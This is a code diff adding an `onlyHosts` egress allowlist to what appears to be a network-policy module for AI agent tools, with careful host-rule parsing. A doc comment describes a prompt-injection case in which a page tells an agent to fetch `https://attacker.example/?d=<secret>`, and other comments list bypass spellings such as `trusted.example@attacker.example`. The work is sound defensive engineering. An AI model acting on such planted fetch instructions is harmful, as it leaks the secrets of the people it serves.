@@ -38,6 +38,29 @@ export interface EgressPolicy {
    * service should not thereby be able to read the metadata endpoint.
    */
   allowedHosts?: string[];
+  /**
+   * The only hosts a tool may reach, when set — exact names or literal
+   * addresses, or `*.example.com` for every subdomain (not `example.com`
+   * itself; list both). Unset reaches any public host, which is the
+   * default and stays it; so does a list containing `*`, which is how one
+   * agent's override lifts a list every other agent inherits — a
+   * per-agent setting replaces the default rather than removing it, so
+   * without a value meaning "any host" there was no way back out.
+   *
+   * The other settings here widen the address check; this one narrows
+   * what is reachable at all, and on a different axis. The address check
+   * protects the machine from the agent's requests. This protects what the
+   * agent has read from leaving: an agent that read a page telling it to
+   * fetch `https://attacker.example/?d=<secret>` can send that URL anywhere
+   * public, and only a list of where it may go closes that channel.
+   *
+   * An `allowedHosts` entry stays reachable whatever this says — naming a
+   * host to exempt it is naming it to reach it, and making an operator
+   * write it twice would make the second copy the one that goes missing.
+   * It narrows the *names*, never the address check: a listed host that
+   * resolves to a private address is still refused.
+   */
+  onlyHosts?: string[];
 }
 
 const DEFAULT_SCHEMES = ['http:', 'https:'];
@@ -45,7 +68,7 @@ const DEFAULT_SCHEMES = ['http:', 'https:'];
 /**
  * The policy a plugin's settings describe.
  *
- * Every tool that reaches the network reads the same two keys out of its
+ * Every tool that reaches the network reads the same keys out of its
  * own config block, and this used to be a hand-rolled copy per package.
  * They are not a preference: `allowedHosts` is an access boundary between
  * agents, so a third copy of "what do these two settings mean" would be a
@@ -53,16 +76,27 @@ const DEFAULT_SCHEMES = ['http:', 'https:'];
  * against `JsonObject` so this package keeps its zero dependencies.
  *
  * Anything that is not the expected type is dropped rather than guessed at
- * — a misspelled `allowedHosts: "localhost"` opens nothing.
+ * — a misspelled `allowedHosts: "localhost"` opens nothing. `onlyHosts`
+ * fails closed the same way from the other side: it is a restriction, so
+ * dropping a malformed one would lift it, and a value that is present but
+ * not a list reaches nothing.
  */
 export const egressPolicyFrom = (settings: {
   allowPrivateAddresses?: unknown;
   allowedHosts?: unknown;
+  onlyHosts?: unknown;
 } | undefined): EgressPolicy => ({
   ...(settings?.allowPrivateAddresses === true ? { allowPrivateAddresses: true } : {}),
   ...(Array.isArray(settings?.allowedHosts)
     ? { allowedHosts: settings.allowedHosts.filter((entry): entry is string => typeof entry === 'string') }
     : {}),
+  ...(settings?.onlyHosts === undefined
+    ? {}
+    : {
+        onlyHosts: Array.isArray(settings.onlyHosts)
+          ? settings.onlyHosts.filter((entry): entry is string => typeof entry === 'string')
+          : [],
+      }),
 });
 
 const parseIPv4 = (value: string): number[] | undefined => {
@@ -246,8 +280,119 @@ const hostMatches = (policy: EgressPolicy, host: string): boolean => {
   return (policy.allowedHosts ?? []).some((entry) => entry.toLowerCase() === normalized);
 };
 
-/** Whether one resolved address may be connected to for this host. */
+/**
+ * A name as `onlyHosts` compares it. The trailing dot goes on both sides:
+ * `example.com.` is the same host as `example.com` to DNS, and a rule that
+ * saw two names would refuse one spelling and — for a wildcard — could be
+ * walked past with the other.
+ */
+const normalizeHost = (host: string): string => host.toLowerCase().replace(/^\[|\]$/g, '').replace(/\.$/, '');
+
+/**
+ * A host in the form a URL gives it: punycode for a Unicode name, an IPv6
+ * literal compressed and lowercased. Rules are written by people and hosts
+ * arrive from `URL`, so both sides go through the same parser or
+ * `bücher.de` never matches the `xn--bcher-kva.de` a request carries.
+ *
+ * Only a hostname or an IPv6 literal is parsed. Anything else would be
+ * parsed as a URL *authority*, where `trusted.example@attacker.example` is
+ * user-info and a host — and a rule meant for the first would allow the
+ * second. A rule carrying URL syntax, or one the parser refuses, keeps its
+ * plain form, which no host from a URL can equal: it matches nothing.
+ */
+const HOSTNAME_CHARACTERS = /^[a-z0-9._\-\u0080-\uffff]+$/;
+
+const canonicalHost = (host: string): string => {
+  const plain = normalizeHost(host);
+  if (plain === '') return plain;
+  if (!expandIPv6(plain) && !HOSTNAME_CHARACTERS.test(plain)) return plain;
+  try {
+    const parsed = new URL(`http://${expandIPv6(plain) ? `[${plain}]` : plain}/`);
+    // Belt to the character check's braces: a parse that found anything
+    // but a host — a fullwidth `＠` IDNA maps onto `@`, say — is not one.
+    if (parsed.username !== '' || parsed.password !== '' || parsed.port !== '' || parsed.pathname !== '/') {
+      return plain;
+    }
+    return normalizeHost(parsed.hostname);
+  } catch {
+    return plain;
+  }
+};
+
+type HostRule = 'any' | { wildcard: boolean; host: string };
+
+/**
+ * One `onlyHosts` entry, read against the grammar it is documented to
+ * take, or `undefined` for anything else — which then matches nothing.
+ *
+ * Checked whole, before anything is stripped. Every way a malformed rule
+ * has turned into a working one here came from cleaning it piece by piece:
+ * `*.` lost its dot and became `*`, brackets came off `[*.example.com]`,
+ * two trailing dots came off `*.example.com..` one step at a time, and a
+ * URL parser read `trusted.example@attacker.example` as the second host.
+ *
+ * The grammar: `*` alone; a hostname — labels of name characters joined by
+ * single dots, one trailing dot allowed — optionally after `*.`; or an
+ * IPv6 literal, bracketed or bare. IPv4 literals are hostnames to this
+ * grammar, and the URL parser gives them their canonical form.
+ */
+const LABELS = /^[a-z0-9_\-\u0080-\uffff]+(?:\.[a-z0-9_\-\u0080-\uffff]+)*\.?$/;
+
+const parseHostRule = (entry: string): HostRule | undefined => {
+  const raw = entry.trim().toLowerCase();
+  if (raw === '*') return 'any';
+  const bracketed = /^\[([^[\]]+)\]$/.exec(raw);
+  if (bracketed !== null) {
+    return expandIPv6(bracketed[1] ?? '') ? { wildcard: false, host: canonicalHost(bracketed[1] ?? '') } : undefined;
+  }
+  if (expandIPv6(raw)) return { wildcard: false, host: canonicalHost(raw) };
+  const wildcard = raw.startsWith('*.');
+  const name = wildcard ? raw.slice(2) : raw;
+  if (!LABELS.test(name)) return undefined;
+  const host = canonicalHost(name);
+  return host === '' ? undefined : { wildcard, host };
+};
+
+const onlyHostsMatch = (entries: readonly string[], host: string): boolean => {
+  const normalized = canonicalHost(host);
+  return entries.some((entry) => {
+    const rule = parseHostRule(entry);
+    if (rule === undefined) return false;
+    if (rule === 'any') return true;
+    // `*.example.com` is every subdomain, at any depth, and never the
+    // apex: the suffix carries its leading dot, so `badexample.com` does
+    // not end with it.
+    return rule.wildcard ? normalized.endsWith(`.${rule.host}`) : rule.host === normalized;
+  });
+};
+
+/**
+ * Whether a host may be reached at all, before any address is looked at.
+ * Its own export because the URL check needs it for a *name*, which it has
+ * no address for yet — a refused host should fail before a DNS query
+ * announces it, not after.
+ */
+export const checkHost = (policy: EgressPolicy, host: string): AddressVerdict => {
+  if (policy.onlyHosts === undefined || onlyHostsMatch(policy.onlyHosts, host) || hostMatches(policy, host)) {
+    return { allowed: true };
+  }
+  return {
+    allowed: false,
+    reason: `${normalizeHost(host)} is not one of the hosts this agent may reach. `
+      + 'An operator can add it to onlyHosts in this plugin\'s config',
+  };
+};
+
+/**
+ * Whether one resolved address may be connected to for this host. The host
+ * is judged first, so every path that dials — the pinned lookup, the
+ * browser's proxy — enforces `onlyHosts` without a second call to forget.
+ */
 export const checkAddress = (policy: EgressPolicy, host: string, address: string): AddressVerdict => {
+  const reachable = checkHost(policy, host);
+  if (!reachable.allowed) {
+    return reachable;
+  }
   if (policy.allowPrivateAddresses || hostMatches(policy, host)) {
     return { allowed: true };
   }
@@ -287,6 +432,10 @@ export const assertRequestAllowed = (rawUrl: string, policy: EgressPolicy = {}):
   }
 
   const host = url.hostname.replace(/^\[|\]$/g, '');
+  const reachable = checkHost(policy, host);
+  if (!reachable.allowed) {
+    throw new EgressPolicyError(`Refusing ${url.href}: ${reachable.reason}.`);
+  }
   const literal = parseIPv4(host) ? host : (expandIPv6(host) ? host : undefined);
   if (literal) {
     const verdict = checkAddress(policy, host, literal);
